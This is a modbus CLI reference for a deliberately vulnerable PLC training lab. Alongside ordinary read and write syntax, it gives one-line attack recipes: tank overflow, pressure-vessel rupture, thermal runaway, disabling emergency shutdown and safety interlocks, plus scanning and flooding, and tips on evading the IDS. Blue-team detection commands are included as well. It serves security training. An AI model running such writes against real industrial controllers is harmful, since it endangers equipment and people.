# Modbus CLI Reference Guide

Quick reference for the `modbus` command-line tool used with Vuln-PLC.

## General Syntax

```bash
sudo modbus <host>:<port> <operation> <address> [value] [count]
```

---

## 1. Read Operations

### Read Single Register/Coil
```bash
sudo modbus 127.0.0.1:5502 read <address>
```

**Example:**
```bash
sudo modbus 127.0.0.1:5502 read 0
```

### Read Multiple Registers
```bash
sudo modbus 127.0.0.1:5502 read <start_address> <count>
```

**Example:**
```bash
# Read 10 registers starting at address 0
sudo modbus 127.0.0.1:5502 read 0 10
```

---

## 2. Write Operations

### Write Single Register/Coil
```bash
sudo modbus 127.0.0.1:5502 write <address> <value>
```

**Examples:**
```bash
sudo modbus 127.0.0.1:5502 write 0 1     # Turn pump ON
sudo modbus 127.0.0.1:5502 write 1 0     # Close valve
sudo modbus 127.0.0.1:5502 write 10 255  # Set register 10 to 255
```

### Write Multiple Registers
```bash
sudo modbus 127.0.0.1:5502 write <start_address> <count> <v1> <v2> ...
```

**Example:**
```bash
# Write values 45 and 77 to registers 10 and 11
sudo modbus 127.0.0.1:5502 write 10 2 45 77
```

---

## 3. Bit Operations (Coils)

### Set Coil ON
```bash
sudo modbus 127.0.0.1:5502 write <address> 1
```

### Set Coil OFF
```bash
sudo modbus 127.0.0.1:5502 write <address> 0
```

**Example Use Cases:**
- `write 0 1` - Start pump
- `write 0 0` - Stop pump
- `write 1 1` - Open valve
- `write 1 0` - Close valve

---

## 4. Device Commands

### Read Device Information
```bash
sudo modbus 127.0.0.1:5502 device-info
```
or
```bash
sudo modbus 127.0.0.1:5502 info
```

---

## 5. Raw Function Codes (Advanced)

### Generic Function Code Execution
```bash
sudo modbus 127.0.0.1:5502 fc <function_code> <args...>
```

**Common Function Codes:**
- `fc 1` - Read Coils
- `fc 2` - Read Discrete Inputs
- `fc 3` - Read Holding Registers
- `fc 4` - Read Input Registers
- `fc 5` - Write Single Coil
- `fc 6` - Write Single Register
- `fc 15` - Write Multiple Coils
- `fc 16` - Write Multiple Registers

**Examples:**
```bash
sudo modbus 127.0.0.1:5502 fc 1 0 10    # Read 10 coils starting at 0
sudo modbus 127.0.0.1:5502 fc 3 0 2     # Read holding registers 0-1
sudo modbus 127.0.0.1:5502 fc 6 10 500  # Write 500 to register 10
```

---

## 6. Testing & Diagnostics

### Test Connectivity
```bash
sudo modbus 127.0.0.1:5502 read 0
```

### Dump Registers
```bash
# Read first 20 registers
sudo modbus 127.0.0.1:5502 read 0 20

# Read all 100 registers
sudo modbus 127.0.0.1:5502 read 0 100
```

### Scan for Active Addresses
```bash
# Simple bash loop to scan
for i in {0..99}; do
  echo "Register $i:";
  sudo modbus 127.0.0.1:5502 read $i;
done
```

---

## 7. Vuln-PLC Attack Scenarios

### PLC Port Reference
- **PLC-1 (Tank):** `127.0.0.1:5502`
- **PLC-2 (Pressure):** `127.0.0.1:5503`
- **PLC-3 (Temperature):** `127.0.0.1:5504`
- **PLC-4 (Safety/ESD):** `127.0.0.1:5505`

### Tank Overflow Attack (PLC-1)
```bash
# Force pump ON, valve CLOSED
sudo modbus 127.0.0.1:5502 write 0 1     # Pump ON
sudo modbus 127.0.0.1:5502 write 1 0     # Valve CLOSED
# Watch tank overflow on HMI: http://localhost:8000
```

### Pressure Vessel Attack (PLC-2)
```bash
# Force compressor ON, relief valve CLOSED
sudo modbus 127.0.0.1:5503 write 0 1     # Compressor 1 ON
sudo modbus 127.0.0.1:5503 write 1 0     # Relief valve CLOSED
# Pressure will spike until rupture
```

### Thermal Runaway Attack (PLC-3)
```bash
# Force heater ON, cooling OFF
sudo modbus 127.0.0.1:5504 write 0 1     # Heater ON
sudo modbus 127.0.0.1:5504 write 1 0     # Cooling OFF
# Temperature will rise until damage
```

### Disable Safety Systems (PLC-4)
```bash
# Disable emergency shutdown system
sudo modbus 127.0.0.1:5505 write 0 0     # Disable ESD
sudo modbus 127.0.0.1:5505 write 5 1     # Bypass safety interlock
```

### Drain Tank Attack
```bash
sudo modbus 127.0.0.1:5502 write 0 0     # Pump OFF
sudo modbus 127.0.0.1:5502 write 1 1     # Valve OPEN (100%)
# Tank will drain to 0%
```

### Invalid Value Injection
```bash
# Write extreme values to cause errors
sudo modbus 127.0.0.1:5502 write 10 9999   # Out of range value
sudo modbus 127.0.0.1:5502 write 20 -500   # Negative value
```

### Sequential Register Scanning (IDS Detection)
```bash
# This will trigger IDS alerts
for i in {0..99}; do
  sudo modbus 127.0.0.1:5502 read $i 1
done
```

### Flooding Attack (IDS Detection)
```bash
# Rapid-fire requests
for i in {1..1000}; do
  sudo modbus 127.0.0.1:5502 read 0 &
done
```

---

## 8. Troubleshooting

### Permission Denied
If you get "Permission denied", add `sudo`:
```bash
sudo modbus 127.0.0.1:5502 read 0
```

### Connection Refused
Check if PLC is running:
```bash
netstat -tuln | grep 5502
```

Or:
```bash
lsof -i :5502
```

### Command Not Found
Install modbus-cli:
```bash
pip install modbus-cli
```

### Timeout Errors
Increase timeout (if supported by your modbus client):
```bash
sudo modbus 127.0.0.1:5502 --timeout 5 read 0
```

---

## 9. Blue Team Detection

### Monitor Modbus Traffic
```bash
# Watch IDS logs
tail -f logs/modbus_ids.log

# Or use tcpdump
sudo tcpdump -i any -n port 502 -A
```

### Check for Anomalies
```bash
# Look for unauthorized writes
grep "UNAUTHORIZED_WRITE" logs/modbus_ids.log

# Look for scanning attempts
grep "REGISTER_SCAN" logs/modbus_ids.log

# Look for flooding
grep "RATE_LIMIT" logs/modbus_ids.log
```

---

## 10. Common Register Mappings

### PLC-1 (Tank Control) - Port 5502
| Address | Type | Description |
|---------|------|-------------|
| 0 | Coil | Pump Status (0=OFF, 1=ON) |
| 1 | Coil | Outlet Valve (0=CLOSED, 1=OPEN) |
| 2 | Coil | Drain Valve (0=CLOSED, 1=OPEN) |
| 10 | Register | Tank Level (0-100%) |
| 11 | Register | Flow Rate (GPM) |
| 20 | Register | Pump Runtime (hours) |

### PLC-2 (Pressure System) - Port 5503
| Address | Type | Description |
|---------|------|-------------|
| 0 | Coil | Compressor 1 (0=OFF, 1=ON) |
| 1 | Coil | Compressor 2 (0=OFF, 1=ON) |
| 2 | Coil | Relief Valve 1 (0=CLOSED, 1=OPEN) |
| 10 | Register | Pressure (PSI) |
| 11 | Register | Compressor Speed (RPM) |

### PLC-3 (Temperature) - Port 5504
| Address | Type | Description |
|---------|------|-------------|
| 0 | Coil | Heater (0=OFF, 1=ON) |
| 1 | Coil | Cooling System (0=OFF, 1=ON) |
| 10 | Register | Temperature (°C) |
| 11 | Register | Setpoint (°C) |

### PLC-4 (Safety/ESD) - Port 5505
| Address | Type | Description |
|---------|------|-------------|
| 0 | Coil | Emergency Shutdown Active |
| 5 | Coil | Safety Interlock Bypass |
| 10 | Register | Alarm Count |
| 20 | Register | System Status Code |

---

## 11. Best Practices

### For Red Team / Attackers:
- Start with read operations to map the system
- Use delays between writes to avoid detection
- Monitor IDS logs to test evasion techniques
- Document register mappings for later exploitation

### For Blue Team / Defenders:
- Baseline normal Modbus traffic patterns
- Monitor for sequential scanning (rapid address increments)
- Watch for writes to critical addresses (safety systems)
- Alert on unusual write frequencies
- Correlate Modbus activity with physical process changes

### For Training:
- Always use in isolated lab environment
- Get authorization before testing
- Document your attack chain
- Practice both offensive and defensive techniques
- Review PCAP captures post-exercise

---

## 12. Additional Resources

- **Modbus Specification:** http://www.modbus.org/specs.php
- **Vuln-PLC Documentation:** See `docs/` directory
- **Attack Scenarios:** See `docs/ATTACK_SCENARIOS.md`
- **Blue Team Guide:** See `docs/BLUE_TEAM_GUIDE.md`
- **IDS Configuration:** See `modbus_ids.py`

---

**Last Updated:** 2024-12-07
**Version:** 2.0
